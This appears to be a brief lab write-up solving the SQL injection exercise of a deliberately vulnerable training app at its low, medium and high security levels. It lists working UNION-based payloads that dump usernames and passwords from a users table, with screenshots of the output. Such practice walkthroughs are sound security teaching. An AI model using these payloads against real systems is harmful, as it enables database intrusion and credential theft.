# SQL Injection


**Security level is currently: low.**

We can detect SQL injection with `'` on submiting this we get SQL error.

we can see all entries with `' or 1=1#` :

<img width="248" alt="image" src="https://user-images.githubusercontent.com/79740895/185461785-b0426c0a-db1c-4118-b654-fe62a8b607c9.png">

We can extract all passwords with payload:

```' UNION SELECT user, password FROM users#```

<img width="271" alt="image" src="https://user-images.githubusercontent.com/79740895/185463551-74dfcac3-bed2-44b5-9fd8-4bf6bcc78e2b.png">


**Security level is currently: medium.**

It's using POST parameter and quotes are filtered, but ID value is directly added to the query so we dont even need quotes 

payload: `1 or 1=1 UNION SELECT user, password FROM users#`

<img width="326" alt="image" src="https://user-images.githubusercontent.com/79740895/185467076-707fd767-e575-42d1-9b86-5a16937f133d.png">

**Security level is currently: high.**

payload from low security also works here

Payload: `' UNION SELECT user, password FROM users#`

<img width="281" alt="image" src="https://user-images.githubusercontent.com/79740895/185468611-17e12bd2-8513-4844-beac-b0d8d9c27725.png">

<br/>
